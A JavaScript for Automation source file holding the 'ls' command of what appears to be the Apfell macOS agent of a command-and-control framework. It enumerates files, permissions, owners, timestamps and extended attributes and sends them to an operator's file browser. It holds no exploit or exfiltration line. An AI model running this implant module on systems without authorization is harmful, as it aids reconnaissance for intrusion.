exports.ls = function(task, command, params){
    ObjC.import('Foundation');
    let output = {};
    try {
        let command_params = JSON.parse(params);
        let fileManager = $.NSFileManager.defaultManager;
        let error = Ref();
        let path = command_params['path'];
        if (path === "" || path === ".") {
            path = fileManager.currentDirectoryPath.js;
            if (path === undefined || path === "") {
                return {
                    "user_output": "Failed to get current working directory",
                    "completed": true,
                    "status": "error"
                };
            }
        }
        if (path[0] === '"' || path[0] === "'") {
            path = path.substring(1, path.length - 1);
        }
        if(path[0] === '~'){
            path = $(path).stringByExpandingTildeInPath.js;
        }
        output['host'] = ObjC.unwrap(apfell.procInfo.hostName);
        output['update_deleted'] = true;
        let attributes = ObjC.deepUnwrap(fileManager.attributesOfItemAtPathError($(path), error));
        let time_attributes = ObjC.unwrap(fileManager.attributesOfItemAtPathError($(path), error));
        if (attributes !== undefined) {
            output['is_file'] = true;
            output["success"] = true;
            output['files'] = [];
            if (attributes.hasOwnProperty('NSFileType') && attributes['NSFileType'] === "NSFileTypeDirectory") {
                let error = Ref();
                output['is_file'] = false;
                let files = ObjC.deepUnwrap(fileManager.contentsOfDirectoryAtPathError($(path), error));
                if (files !== undefined) {
                    let files_data = [];
                    output['success'] = true;
                    let sub_files = files;
                    if (path[path.length - 1] !== "/") {
                        path = path + "/";
                    }
                    for (let i = 0; i < sub_files.length; i++) {
                        let attr = ObjC.deepUnwrap(fileManager.attributesOfItemAtPathError($(path + sub_files[i]), error));
                        let time_attr = ObjC.unwrap(fileManager.attributesOfItemAtPathError($(path + sub_files[i]), error));
                        let file_add = {};
                        file_add['name'] = sub_files[i];
                        file_add['is_file'] = attr['NSFileType'] !== "NSFileTypeDirectory";
                        let plistPerms = ObjC.unwrap(fileManager.attributesOfItemAtPathError($(path + sub_files[i]), $()));
                        if(plistPerms['NSFileExtendedAttributes'] !== undefined){
                            let extended = {};
                            let perms = plistPerms['NSFileExtendedAttributes'].js;
                            for(let j in perms){
                                extended[j] = perms[j].base64EncodedStringWithOptions(0).js;
                            }
                            file_add['permissions'] = extended;
                        }else{
                            file_add['permissions'] = {};
                        }
                        file_add['size'] = attr['NSFileSize'];
                        let nsposix = attr['NSFilePosixPermissions'];
                        // we need to fix this mess to actually be real permission bits that make sense
                        file_add['permissions']['posix'] = ((nsposix >> 6) & 0x7).toString() + ((nsposix >> 3) & 0x7).toString() + (nsposix & 0x7).toString();
                        file_add['permissions']['owner'] = attr['NSFileOwnerAccountName'] + "(" + attr['NSFileOwnerAccountID'] + ")";
                        file_add['permissions']['group'] = attr['NSFileGroupOwnerAccountName'] + "(" + attr['NSFileGroupOwnerAccountID'] + ")";
                        file_add['permissions']['hidden'] = attr['NSFileExtensionAttribute'] === true;
                        file_add['permissions']['create_time'] = Math.trunc(time_attr['NSFileCreationDate'].timeIntervalSince1970 * 1000);
                        file_add['modify_time'] = Math.trunc(time_attr['NSFileModificationDate'].timeIntervalSince1970 * 1000);
                        file_add['access_time'] = 0;
                        files_data.push(file_add);
                    }
                    output['files'] = files_data;
                }
                else{
                    output['success'] = false;
                }
            }
            let nsposix = attributes['NSFilePosixPermissions'];
            let components =  ObjC.deepUnwrap( fileManager.componentsToDisplayForPath(path) ).slice(1);
            if( components.length > 0 && components[0] === "Macintosh HD"){
                components.pop();
            }
            // say components = "etc, krb5.keytab"
            // check all components to see if they're symlinks
            let parent_path = "/";
            for(let p = 0; p < components.length; p++){
                let resolvedSymLink = fileManager.destinationOfSymbolicLinkAtPathError( $( parent_path + components[p] ), $.nil ).js;
                if(resolvedSymLink){
                    parent_path = parent_path + resolvedSymLink + "/";
                }else{
                    parent_path = parent_path + components[p] + "/";
                }
            }
            output['name'] = fileManager.displayNameAtPath(parent_path).js;
            output['parent_path'] = parent_path.slice(0, -(output["name"].length + 1));

            if(output['name'] === "Macintosh HD"){output['name'] = "/";}
            if(output['name'] === output['parent_path']){output['parent_path'] = "";}
            if(command_params['path'] === "/dev"){
                // /dev is apparently a special case for some reason and doesn't follow the normal fileManager.componentsToDisplayForPath
                output["name"] = "dev";
                output["parent_path"] = "/";
            }
            output['size'] = attributes['NSFileSize'];
            output['access_time'] = 0;
            output['modify_time'] = Math.trunc(time_attributes['NSFileModificationDate'].timeIntervalSince1970 * 1000);
            if(attributes['NSFileExtendedAttributes'] !== undefined){
                let extended = {};
                let perms = attributes['NSFileExtendedAttributes'].js;
                for(let j in perms){
                    extended[j] = perms[j].base64EncodedStringWithOptions(0).js;
                }
                output['permissions'] = extended;
            }else{
                output['permissions'] = {};
            }
            output['permissions']['create_time'] = Math.trunc(time_attributes['NSFileCreationDate'].timeIntervalSince1970 * 1000);
            output['permissions']['posix'] =((nsposix >> 6) & 0x7).toString() + ((nsposix >> 3) & 0x7).toString() + (nsposix & 0x7).toString();
            output['permissions']['owner'] = attributes['NSFileOwnerAccountName'] + "(" + attributes['NSFileOwnerAccountID'] + ")";
            output['permissions']['group'] = attributes['NSFileGroupOwnerAccountName'] + "(" + attributes['NSFileGroupOwnerAccountID'] + ")";
            output['permissions']['hidden'] = attributes['NSFileExtensionHidden'] === true;
            if(command_params['file_browser']){
                return {"file_browser": output, "completed": true, "user_output": "added data to file browser"};
            }else{
                return {"file_browser": output, "completed": true, "user_output": JSON.stringify(output, null, 6)};
            }
        }
        else{
            return {
                "user_output": "Failed to get attributes of file. File doesn't exist or you don't have permission to read it",
                "completed": true,
                "status": "error"
            };
        }

    }catch(error){
        return {
            "user_output": "Error: " + error.toString(),
            "completed": true,
            "status": "error"
        };
    }
};